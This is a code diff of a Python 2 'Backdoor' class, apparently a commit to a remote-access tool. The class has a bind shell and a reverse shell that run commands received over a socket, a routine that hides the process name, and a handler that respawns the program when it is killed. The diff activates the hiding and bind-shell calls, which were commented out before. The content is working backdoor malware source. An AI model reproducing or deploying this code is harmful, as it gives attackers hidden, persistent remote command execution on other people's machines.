@@ -17,7 +17,7 @@ class Backdoor:
 	def relaunch(self, signal, frame):
 		cmd = sys.argv
 		proc = subprocess.Popen(' '.join(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		print "[+] Respawning..."
+		print "[+] Restarting..."
 
 	def hide_process(self):
 		ch = string.uppercase + string.digits
@@ -32,7 +32,8 @@ class Backdoor:
 		#Relaunch on kill
 		signal.signal(signal.SIGTERM, self.relaunch)
 
-	def shell_text(self, sock, data):
+	#Interuot command line to display empty for all commands
+	def shell_text_interupt(self, sock, data):
 		return sock.send("[{0}]> ".format(data))
 
 
@@ -56,7 +57,7 @@ class Backdoor:
 					command = client.recv(1024).encode("UTF-8")
 					result = os.popen(command).read()
 					client.send(result)
-					self.shell_text(client, host)
+					self.shell_text_interupt(client, host)
 
 		except Exception as error:
 			print "[-] Failed to create socket: {0}".format(str(error))
@@ -77,13 +78,17 @@ class Backdoor:
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			sock.connect((host,port))
 			cmd = ""
-
 			while True:
 				cmd = sock.recv(1024).encode("UTF-8")
-				proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+				if cmd.strip("\n") == "exit":
+					sock.close()
+				proc = subprocess.Popen(cmd, 
+					stdout=subprocess.PIPE, 
+					stderr=subprocess.PIPE, 
+					shell=True)
 				proc_out = "{0} {1}\n".format(proc.stdout.read(), proc.stderr.read())
 				sock.send(proc_out)
-				self.shell_text(sock, host)
+				self.shell_text_interupt(sock, host)
 			sock.close()
 
 		except Exception as error:
@@ -93,6 +98,6 @@ class Backdoor:
 
 if __name__ == '__main__':
 	bd = Backdoor()
-	#bd.hide_process()
-	#bd.bind_shell(sys.argv[1], int(sys.argv[2]))
+	bd.hide_process()
+	bd.bind_shell(sys.argv[1], int(sys.argv[2]))
 	bd.connect_as_reverse_shell(str(sys.argv[1]), int(sys.argv[2]))
